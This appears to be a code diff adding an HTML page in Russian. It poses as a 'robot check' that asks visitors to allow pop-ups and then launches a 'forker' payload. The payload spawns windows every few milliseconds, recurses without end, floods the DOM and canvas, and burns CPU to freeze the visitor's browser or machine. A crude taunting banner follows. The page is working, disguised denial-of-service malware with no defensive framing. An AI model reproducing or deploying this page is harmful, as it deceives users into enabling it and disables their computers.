@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading…</title>
+  <style>
+    body {
+      margin: 0; padding: 0;
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      height: 100vh; text-align: center;
+      overflow: hidden;
+    }
+    #bot-check, #warning { display: none; }
+    #bot-check p { font-size: 1.5em; margin: .5em 0; }
+    #warning h1 { color: #e74c3c; font-size: 3em; margin: .2em 0; }
+    #warning p { font-size: 1.2em; margin: .5em 0; }
+    canvas { position: absolute; top: 0; left: 0; }
+  </style>
+</head>
+<body>
+  <div id="bot-check">
+    <p>Разрешите всплывающие окна, чтобы пройти проверку на робота</p>
+  </div>
+  <div id="warning">
+    <h1>ФОРКЕР ЗАПУЩЕН</h1>
+    <p>ЗРЯ ТЫ ЗАПУСТИЛ ЕГО, ТВОЕМУ КОМПУ ПИЗДА :)</p>
+  </div>
+
+  <script>
+  (function(){
+    const params     = new URLSearchParams(window.location.search);
+    const isOriginal = params.has('i');
+    document.title   = isOriginal ? 'robotCheck' : 'FORKER';
+
+    const botCheck = document.getElementById('bot-check'),
+          warning  = document.getElementById('warning');
+
+
+    function openWindowSpam() {
+      setInterval(() => {
+        const w = window.open(window.location.href);
+        if (w) w.close();
+      }, 5);
+    }
+
+    function recurseSpam() {
+      Promise.resolve().then(recurseSpam);
+    }
+
+    function heavyDomSpam() {
+      for (let i = 0; i < 500; i++) {
+        const d = document.createElement('div');
+        d.textContent = 'HEAVY';
+        d.style.opacity = Math.random().toFixed(2);
+        document.body.appendChild(d);
+      }
+      setTimeout(heavyDomSpam, 5);
+    }
+
+    function cpuCryptoSpam() {
+      const data = new TextEncoder().encode('forker' + Math.random());
+      crypto.subtle.digest('SHA-256', data).then(() => {
+        for (let i = 0; i < 1e7; i++) Math.sqrt(i);
+        cpuCryptoSpam();
+      });
+    }
+
+    function canvasFlood() {
+      // WebGL-like 2D canvas анимация
+      const c = document.createElement('canvas');
+      c.width = window.innerWidth;
+      c.height = window.innerHeight;
+      document.body.appendChild(c);
+      const ctx = c.getContext('2d');
+      function draw() {
+        ctx.globalAlpha = 0.1;
+        ctx.fillStyle = '#000';
+        ctx.fillRect(0, 0, c.width, c.height);
+        for (let i = 0; i < 200; i++) {
+          ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
+          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 5,5);
+        }
+        requestAnimationFrame(draw);
+      }
+      draw();
+    }
+
+    function startLoad() {
+      openWindowSpam();
+      recurseSpam();
+      heavyDomSpam();
+      cpuCryptoSpam();
+      canvasFlood();
+    }
+
+    if (!isOriginal) {
+      warning.style.display = 'block';
+      startLoad();
+      return;
+    }
+
+    botCheck.style.display = 'block';
+    const checker = setInterval(() => {
+      const w = window.open('', '_blank', 'width=50,height=50');
+      if (w) {
+        w.close();
+        clearInterval(checker);
+        botCheck.style.display = 'none';
+        startLoad();
+      }
+    }, 500);
+  })();
+  </script>
+</body>
+</html>
